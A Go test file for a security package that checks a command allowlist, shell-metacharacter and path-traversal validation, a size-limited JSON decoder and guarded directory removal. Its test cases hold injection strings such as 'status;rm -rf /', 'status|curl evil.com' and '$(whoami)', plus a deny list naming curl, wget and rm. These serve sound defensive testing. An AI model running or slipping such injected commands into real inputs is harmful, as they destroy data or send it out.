package security

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

func TestSafeCommandExecutor(t *testing.T) {
	executor := NewSafeCommandExecutor()
	
	t.Run("IsCommandAllowed", func(t *testing.T) {
		tests := []struct {
			cmd     string
			allowed bool
		}{
			{"git", true},
			{"rm", false},
			{"curl", false},
			{"wget", false},
		}
		
		for _, tt := range tests {
			if got := executor.IsCommandAllowed(tt.cmd); got != tt.allowed {
				t.Errorf("IsCommandAllowed(%q) = %v, want %v", tt.cmd, got, tt.allowed)
			}
		}
	})
	
	t.Run("ValidateCommandArgs", func(t *testing.T) {
		tests := []struct {
			name    string
			args    []string
			wantErr bool
		}{
			{"Safe args", []string{"status", "--porcelain"}, false},
			{"Semicolon injection", []string{"status;rm -rf /"}, true},
			{"Pipe injection", []string{"status|curl evil.com"}, true},
			{"Backtick injection", []string{"status`whoami`"}, true},
			{"Path traversal", []string{"../../../etc/passwd"}, true},
			{"Dollar sign", []string{"$HOME"}, true},
			{"Parentheses", []string{"$(whoami)"}, true},
			{"Newline", []string{"status\nrm -rf /"}, true},
		}
		
		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				err := executor.ValidateCommandArgs(tt.args)
				if (err != nil) != tt.wantErr {
					t.Errorf("ValidateCommandArgs() error = %v, wantErr %v", err, tt.wantErr)
				}
			})
		}
	})
}

func TestSafeJSONDecoder(t *testing.T) {
	t.Run("Valid JSON within limits", func(t *testing.T) {
		decoder := NewSafeJSONDecoder(1024)
		data := map[string]string{"key": "value"}
		jsonData, _ := json.Marshal(data)
		
		var result map[string]string
		err := decoder.Decode(bytes.NewReader(jsonData), &result)
		if err != nil {
			t.Errorf("Decode() unexpected error: %v", err)
		}
		
		if result["key"] != "value" {
			t.Errorf("Decode() result = %v, want %v", result, data)
		}
	})
	
	t.Run("JSON exceeds size limit", func(t *testing.T) {
		decoder := NewSafeJSONDecoder(10) // Very small limit
		data := map[string]string{"key": "very long value that exceeds the limit"}
		jsonData, _ := json.Marshal(data)
		
		var result map[string]string
		err := decoder.Decode(bytes.NewReader(jsonData), &result)
		if err == nil {
			t.Error("Decode() expected error for oversized JSON")
		}
	})
	
	t.Run("Invalid JSON", func(t *testing.T) {
		decoder := NewSafeJSONDecoder(1024)
		invalidJSON := []byte("{invalid json}")
		
		var result map[string]string
		err := decoder.Decode(bytes.NewReader(invalidJSON), &result)
		if err == nil {
			t.Error("Decode() expected error for invalid JSON")
		}
	})
}

func TestSafeFileOperations(t *testing.T) {
	// Create temporary directory for testing
	tmpDir, err := os.MkdirTemp("", "safe_ops_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)
	
	safeOps, err := NewSafeFileOperations(tmpDir)
	if err != nil {
		t.Fatalf("Failed to create SafeFileOperations: %v", err)
	}
	
	t.Run("ValidatePath", func(t *testing.T) {
		tests := []struct {
			name    string
			path    string
			wantErr bool
		}{
			{"Valid relative path", "subdir/file.txt", false},
			{"Valid absolute within base", filepath.Join(tmpDir, "file.txt"), false},
			{"Path traversal attempt", "../../../etc/passwd", true},
			{"Path outside base", "/etc/passwd", true},
		}
		
		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				_, err := safeOps.ValidatePath(tt.path)
				if (err != nil) != tt.wantErr {
					t.Errorf("ValidatePath() error = %v, wantErr %v", err, tt.wantErr)
				}
			})
		}
	})
	
	t.Run("ValidatePath depth check", func(t *testing.T) {
		// Create a very deep path
		deepPath := "a"
		for i := 0; i < MaxPathDepth+2; i++ {
			deepPath = filepath.Join(deepPath, "b")
		}
		
		_, err := safeOps.ValidatePath(deepPath)
		if err == nil {
			t.Error("ValidatePath() expected error for excessive depth")
		}
	})
	
	t.Run("SafeRemoveAll", func(t *testing.T) {
		// Create a test directory
		testDir := filepath.Join(tmpDir, "test_remove")
		if err := os.MkdirAll(testDir, 0755); err != nil {
			t.Fatalf("Failed to create test dir: %v", err)
		}
		
		// Create a file in the directory
		testFile := filepath.Join(testDir, "file.txt")
		if err := os.WriteFile(testFile, []byte("test"), 0644); err != nil {
			t.Fatalf("Failed to create test file: %v", err)
		}
		
		// Remove the directory
		if err := safeOps.SafeRemoveAll(testDir); err != nil {
			t.Errorf("SafeRemoveAll() unexpected error: %v", err)
		}
		
		// Verify it's removed
		if _, err := os.Stat(testDir); !os.IsNotExist(err) {
			t.Error("SafeRemoveAll() directory still exists")
		}
	})
	
	t.Run("SafeRemoveAll on file", func(t *testing.T) {
		// Create a file
		testFile := filepath.Join(tmpDir, "single_file.txt")
		if err := os.WriteFile(testFile, []byte("test"), 0644); err != nil {
			t.Fatalf("Failed to create test file: %v", err)
		}
		
		// Try to remove it (should fail as it's not a directory)
		err := safeOps.SafeRemoveAll(testFile)
		if err == nil {
			t.Error("SafeRemoveAll() expected error for non-directory")
		}
	})
	
	t.Run("SafeRemoveAll on non-existent", func(t *testing.T) {
		// Try to remove non-existent path
		err := safeOps.SafeRemoveAll(filepath.Join(tmpDir, "non_existent"))
		if err != nil {
			t.Errorf("SafeRemoveAll() unexpected error for non-existent path: %v", err)
		}
	})
}

func TestContainsShellMetacharacters(t *testing.T) {
	tests := []struct {
		input    string
		expected bool
	}{
		{"clean-string", false},
		{"clean_string_123", false},
		{"path/to/file.txt", false},
		{"semicolon;injection", true},
		{"pipe|injection", true},
		{"backtick`injection", true},
		{"dollar$injection", true},
		{"quote'injection", true},
		{"doublequote\"injection", true},
		{"newline\ninjection", true},
		{"null\x00injection", true},
	}
	
	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			if got := containsShellMetacharacters(tt.input); got != tt.expected {
				t.Errorf("containsShellMetacharacters(%q) = %v, want %v", tt.input, got, tt.expected)
			}
		})
	}
}

func TestIsCriticalDirectory(t *testing.T) {
	tests := []struct {
		path     string
		critical bool
	}{
		{"/path/to/.git", true},
		{"/path/to/.ai_code_tracking", true},
		{"/path/to/node_modules", true},
		{"/path/to/vendor", true},
		{"/path/to/normal_dir", false},
		{"/path/to/src", false},
	}
	
	for _, tt := range tests {
		t.Run(tt.path, func(t *testing.T) {
			if got := isCriticalDirectory(tt.path); got != tt.critical {
				t.Errorf("isCriticalDirectory(%q) = %v, want %v", tt.path, got, tt.critical)
			}
		})
	}
}